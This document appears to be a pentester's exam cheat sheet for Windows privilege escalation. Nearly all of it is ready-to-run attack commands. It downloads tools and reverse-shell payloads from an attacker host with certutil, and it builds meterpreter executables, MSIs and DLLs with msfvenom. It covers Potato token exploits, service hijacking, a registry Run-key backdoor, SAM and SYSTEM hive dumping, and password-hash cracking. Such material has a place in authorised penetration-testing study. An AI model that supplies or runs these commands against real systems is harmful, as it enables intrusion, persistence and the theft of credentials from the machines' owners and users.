## 🗺️ PRIVESC FLOW

```
Land Shell → whoami /priv → winPEAS/PowerUp → Identify Vector → Exploit → Verify SYSTEM → Dump Creds
```

---

## 1️⃣ FIRST COMMANDS — Always Run These ⭐

```cmd
whoami
whoami /all
whoami /priv

systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"

net user
net localgroup administrators

wmic qfe list brief                          # installed patches
wmic os get osarchitecture                   # 32 or 64-bit

sc query type= all state= all               # all services
netstat -ano
tasklist /SVC
```

---

## 2️⃣ AUTOMATED ENUMERATION TOOLS ⭐⭐

### winPEAS — Heavy Hitter ⭐⭐⭐

```bash
# Upload from Kali
python3 -m http.server 80

# On target
certutil -urlcache -split -f http://[KALI_IP]/winPEASx64.exe C:\Temp\winpeas.exe
certutil -urlcache -split -f http://[KALI_IP]/winPEASany.exe C:\Temp\winpeas.exe

C:\Temp\winpeas.exe
C:\Temp\winpeas.exe > C:\Temp\out.txt 2>&1
C:\Temp\winpeas.exe quiet servicesinfo
C:\Temp\winpeas.exe quiet windowscreds
```

### PowerUp (PowerShell) ⭐

```powershell
# Upload PowerUp.ps1 then:
powershell -ep bypass
. .\PowerUp.ps1
Invoke-AllChecks                             # run all checks
Invoke-AllChecks | Out-File -Encoding ASCII C:\Temp\powerup.txt

# Individual checks
Get-UnquotedService
Get-ModifiableServiceFile
Get-ModifiableService
Get-RegistryAlwaysInstallElevated
Get-RegistryAutoLogon
Get-CachedGPPPassword
Find-ProcessDLLHijack
Find-PathDLLHijack
```

### Seatbelt

```powershell
# Upload Seatbelt.exe then:
C:\Temp\Seatbelt.exe -group=all
C:\Temp\Seatbelt.exe -group=system
C:\Temp\Seatbelt.exe -group=user
C:\Temp\Seatbelt.exe TokenPrivileges
C:\Temp\Seatbelt.exe CredentialFiles
C:\Temp\Seatbelt.exe Certificates
```

### MSF — local_exploit_suggester ⭐

```bash
# From meterpreter session
run post/multi/recon/local_exploit_suggester
run post/multi/recon/local_exploit_suggester SHOWDESCRIPTION=true
```

---

## 3️⃣ TOKEN IMPERSONATION — Potato Attacks ⭐⭐⭐

### Check Privileges First

```cmd
whoami /priv
# Need one of these:
# SeImpersonatePrivilege   ← Enabled → Potato attacks
# SeAssignPrimaryToken     ← Enabled → Potato attacks
# SeDebugPrivilege         ← Enabled → LSASS dump / migrate
# SeBackupPrivilege        ← Enabled → SAM/SYSTEM read
# SeTakeOwnershipPrivilege ← Enabled → file ownership
```

### Juicy Potato

```bash
# Upload JuicyPotato.exe + payload to target
# Generate payload first (Kali):
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[KALI_IP] LPORT=5555 -f exe -o shell.exe

# Start listener (Kali):
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST [KALI_IP]
set LPORT 5555
exploit -j

# On target (cmd as service account):
certutil -urlcache -f http://[KALI_IP]/JuicyPotato.exe C:\Temp\jp.exe
certutil -urlcache -f http://[KALI_IP]/shell.exe C:\Temp\shell.exe

C:\Temp\jp.exe -l 1337 -p C:\Temp\shell.exe -t *
C:\Temp\jp.exe -l 1337 -p C:\Temp\shell.exe -t * -c {CLSID}

# If default CLSID fails — get OS-specific CLSID:
# https://github.com/ohpe/juicy-potato/tree/master/CLSID
# Windows 10:  {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}
# Windows 2016: {e60687f7-01a1-40aa-86ac-db1cbf673334}
C:\Temp\jp.exe -l 1337 -p C:\Temp\shell.exe -t * -c {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}
```

### Sweet Potato (Modern — Win10/2019)

```bash
# Upload SweetPotato.exe
C:\Temp\SweetPotato.exe -a "whoami"
C:\Temp\SweetPotato.exe -e EfsRpc -p C:\Temp\shell.exe
C:\Temp\SweetPotato.exe -e PrintSpoofer -p C:\Temp\shell.exe -a "-c C:\Temp\shell.exe"
```

### Rogue Potato (No COM server needed)

```bash
# Kali — socat redirect
socat tcp-listen:135,reuseaddr,fork tcp:[TARGET_IP]:9999

# Target:
C:\Temp\RoguePotato.exe -r [KALI_IP] -e "C:\Temp\shell.exe" -l 9999
```

### PrintSpoofer (Win10 / Server 2016+)

```bash
# Upload PrintSpoofer.exe
C:\Temp\PrintSpoofer.exe -i -c cmd                        # interactive SYSTEM cmd
C:\Temp\PrintSpoofer.exe -c "C:\Temp\shell.exe"           # execute payload as SYSTEM
C:\Temp\PrintSpoofer.exe -i -c "powershell -ep bypass"
```

### MSF — Token Impersonation (Incognito)

```bash
# Inside meterpreter
use incognito
list_tokens -u
list_tokens -g
impersonate_token "NT AUTHORITY\\SYSTEM"
impersonate_token "BUILTIN\\Administrators"
steal_token [PID]

# If impersonation succeeds but no SYSTEM shell:
migrate [SYSTEM_PID]
getsystem
```

### getsystem (Meterpreter Auto)

```bash
getsystem
getsystem -t 1           # named pipe impersonation (SpoolSs)
getsystem -t 2           # named pipe impersonation (ApcMadCodegen)
getsystem -t 3           # token duplication
getsystem -t 4           # named pipe (RPCSS)

getuid                   # verify NT AUTHORITY\SYSTEM
```

---

## 4️⃣ UNQUOTED SERVICE PATHS ⭐⭐

### Enumerate

```cmd
# Manual
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"
sc qc [SERVICE_NAME]

# PowerUp
Get-UnquotedService

# Shortcut — look for spaces in path without quotes:
# C:\Program Files\Vuln App\service.exe  ← VULNERABLE
# Will try: C:\Program.exe, C:\Program Files\Vuln.exe first
```

### Exploit

```bash
# Generate payload (Kali)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[KALI_IP] LPORT=4444 -f exe -o Program.exe

# Upload to writable path segment (on target)
certutil -urlcache -f http://[KALI_IP]/Program.exe "C:\Program.exe"
# OR
copy \\[KALI_IP]\share\Program.exe "C:\Program Files\Vuln.exe"

# Restart service (if permissions allow)
sc stop [SERVICE_NAME]
sc start [SERVICE_NAME]
# OR wait for reboot / net stop + start

# Verify writable path
icacls "C:\Program Files\Vuln App"
accesschk.exe -wud "C:\Program Files\Vuln App"
```

### PowerUp Exploit (Auto)

```powershell
Write-ServiceBinary -Name [SERVICE_NAME] -UserName [USER] -Password [PASS]
Invoke-ServiceAbuse -Name [SERVICE_NAME] -UserName [USER] -Password [PASS]
# adds [USER] to local Administrators
```

---

## 5️⃣ WEAK SERVICE PERMISSIONS ⭐⭐

### Enumerate

```cmd
# accesschk (upload Sysinternals accesschk.exe)
accesschk.exe -uwcqv * /accepteula
accesschk.exe -uwcqv [SERVICE_NAME] /accepteula
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv "Everyone" * /accepteula
accesschk.exe -uwdq C:\Windows\System32\ /accepteula

# PowerUp
Get-ModifiableService
Get-ModifiableServiceFile

# Manual
sc qc [SERVICE_NAME]
sc sdshow [SERVICE_NAME]
```

### Exploit — Change Service Binary Path

```cmd
# If you have SERVICE_CHANGE_CONFIG:
sc config [SERVICE_NAME] binpath= "C:\Temp\shell.exe"
sc config [SERVICE_NAME] binpath= "net localgroup administrators [USER] /add"
sc stop [SERVICE_NAME]
sc start [SERVICE_NAME]

# Verify change applied
sc qc [SERVICE_NAME]
```

### Exploit — Replace Service Binary

```cmd
# If service binary is writable:
copy C:\Temp\shell.exe "C:\Path\To\service.exe"
sc stop [SERVICE_NAME]
sc start [SERVICE_NAME]
```

### PowerUp Auto-Exploit

```powershell
Invoke-ServiceAbuse -Name [SERVICE_NAME]
Invoke-ServiceAbuse -Name [SERVICE_NAME] -Command "net localgroup administrators [USER] /add"
```

---

## 6️⃣ ALWAYSINSTALLELEVATED ⭐⭐

### Enumerate

```cmd
# Both must be 1 (0x1)
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# PowerUp
Get-RegistryAlwaysInstallElevated
```

### Exploit

```bash
# Kali — generate MSI payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[KALI_IP] LPORT=4444 -f msi -o shell.msi
msfvenom -p windows/adduser USER=[USER] PASS=[PASS] -f msi -o adduser.msi

# Start listener
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST [KALI_IP]
set LPORT 4444
exploit -j

# On target — install MSI as SYSTEM
certutil -urlcache -f http://[KALI_IP]/shell.msi C:\Temp\shell.msi
msiexec /quiet /qn /i C:\Temp\shell.msi
```

### PowerUp Auto-Exploit

```powershell
Write-UserAddMSI                              # creates UserAdd.msi in current dir
# Run it:
msiexec /quiet /qn /i UserAdd.msi
```

---

## 7️⃣ REGISTRY AUTORUNS ⭐

### Enumerate

```cmd
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon

# PowerUp
Get-ModifiableRegistryAutoRun

# accesschk — check if binary in autorun is writable
accesschk.exe -wvu "C:\Path\To\autorun.exe" /accepteula
```

### Exploit

```bash
# If autorun binary is writable — replace with payload
# Kali:
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[KALI_IP] LPORT=4444 -f exe -o autorun.exe

# Target — overwrite original
copy C:\Temp\autorun.exe "C:\Path\To\autorun.exe"

# Trigger: wait for admin login or reboot
# OR set reg key yourself if writable:
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v backdoor /t REG_SZ /d "C:\Temp\shell.exe" /f
```

---

## 8️⃣ DLL HIJACKING ⭐

### Enumerate

```cmd
# PowerUp
Find-ProcessDLLHijack
Find-PathDLLHijack

# Manual — use Process Monitor (Procmon) on target
# Filter: Result = NAME NOT FOUND, Path ends with .dll
# Look for DLLs searched in writable directories

# Check directories in PATH for write access
echo %PATH%
accesschk.exe -dw "C:\Temp" /accepteula
accesschk.exe -dw "C:\Python27" /accepteula
```

### Exploit — Malicious DLL

```bash
# Kali — create malicious DLL
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[KALI_IP] LPORT=4444 -f dll -o hijack.dll

# Rename to match missing DLL name
mv hijack.dll [MISSING_DLL_NAME].dll

# Upload to writable path that app searches before legitimate path
certutil -urlcache -f http://[KALI_IP]/[MISSING_DLL_NAME].dll C:\Temp\[MISSING_DLL_NAME].dll
copy C:\Temp\[MISSING_DLL_NAME].dll "C:\Path\Searched\First\"

# Restart application / service
sc stop [SERVICE]
sc start [SERVICE]
```

---

## 9️⃣ SAM / SYSTEM DUMP ⭐⭐

### From Target (Admin/SYSTEM shell)

```cmd
# Registry export
reg save HKLM\SAM C:\Temp\SAM
reg save HKLM\SYSTEM C:\Temp\SYSTEM
reg save HKLM\SECURITY C:\Temp\SECURITY

# Copy shadow copies of SAM (always available)
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\Temp\SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Temp\SYSTEM
```

### Download + Crack (Kali)

```bash
# Download files
download C:\\Temp\\SAM /tmp/SAM
download C:\\Temp\\SYSTEM /tmp/SYSTEM

# Offline dump
secretsdump.py -sam /tmp/SAM -system /tmp/SYSTEM LOCAL
impacket-secretsdump -sam /tmp/SAM -system /tmp/SYSTEM LOCAL

# Crack extracted hashes
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=NT
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
```

### Backup SAM Locations (Check if exist)

```cmd
C:\Windows\Repair\SAM
C:\Windows\Repair\SYSTEM
C:\Windows\System32\config\RegBack\SAM
C:\Windows\System32\config\RegBack\SYSTEM
```

---

## 🔟 AUTOLOGON / STORED CREDENTIALS ⭐

```cmd
# Registry autologon creds
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
# Look for: DefaultUserName, DefaultPassword, DefaultDomainName

# cmdkey stored creds
cmdkey /list

# Use stored creds with runas
runas /savecred /user:Administrator "C:\Temp\shell.exe"
runas /savecred /user:[USER] cmd

# PowerUp
Get-RegistryAutoLogon

# Unattend.xml / Sysprep
type C:\Windows\Panther\Unattend.xml
type C:\Windows\Panther\Unattended.xml
type C:\Windows\System32\sysprep\sysprep.xml
type C:\Windows\System32\sysprep.inf

# Decode base64 passwords from Unattend.xml
echo [BASE64_PASS] | base64 -d                 # Kali
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("[BASE64_PASS]"))
```

---

## 1️⃣1️⃣ ACCESSCHK — QUICK REFERENCE

```bash
# Upload accesschk.exe (Sysinternals) first

# All writable services (Authenticated Users)
accesschk.exe /accepteula -uwcqv "Authenticated Users" *
accesschk.exe /accepteula -uwcqv "Everyone" *
accesschk.exe /accepteula -uwcqv Users *

# Specific service perms
accesschk.exe /accepteula -ucqv [SERVICE_NAME]

# File/dir write check
accesschk.exe /accepteula -wud "C:\Program Files"
accesschk.exe /accepteula -wuds "C:\Windows\System32"

# Registry key write
accesschk.exe /accepteula -wudk HKLM\SYSTEM\CurrentControlSet\Services
```

---

## ⚡ QUICK REFERENCE — Vector → Technique

|Finding|Technique|
|---|---|
|SeImpersonatePrivilege|Juicy/Sweet/Rogue Potato, PrintSpoofer|
|SeDebugPrivilege|Migrate to SYSTEM PID, LSASS dump|
|Unquoted service path|Place exe at path gap → restart service|
|Writable service binary|Replace binary with payload|
|SERVICE_CHANGE_CONFIG|`sc config binpath=` → restart|
|AlwaysInstallElevated = 1|msfvenom MSI payload → msiexec|
|Writable autorun key/binary|Replace → wait for admin login|
|DLL not found (writable path)|Malicious DLL → service restart|
|SAM backup readable|secretsdump offline|
|Autologon creds in registry|runas /savecred|
|cmdkey stored creds|runas /savecred /user:Administrator|
|Unattend.xml base64 pass|Decode → use creds|

---

## 🧠 EXAM DECISION TREE

```
Landed shell — need SYSTEM?
│
├── Step 1: whoami /priv
│   ├── SeImpersonatePrivilege → PrintSpoofer (Win10+) or JuicyPotato (older)
│   └── SeDebugPrivilege → getsystem or migrate to SYSTEM process
│
├── Step 2: getsystem (meterpreter — try always)
│   ├── Works? → Done
│   └── Fails? → Continue below
│
├── Step 3: run post/multi/recon/local_exploit_suggester
│   └── Use suggested module → set LHOST + run
│
├── Step 4: winPEAS / PowerUp
│   ├── Unquoted path → place exe → restart service
│   ├── Writable service → sc config binpath= → restart
│   ├── AlwaysInstallElevated → msfvenom MSI → msiexec
│   ├── Autorun writable → replace binary → admin login
│   └── DLL hijack → malicious dll → service restart
│
├── Step 5: Check stored creds
│   ├── reg query Winlogon → autologon plaintext
│   ├── cmdkey /list → runas /savecred
│   └── Unattend.xml → decode base64 pass
│
└── Step 6: SAM dump
    ├── reg save SAM + SYSTEM → secretsdump offline
    └── VSS shadow copy SAM → secretsdump → crack → psexec SYSTEM
```

---
---
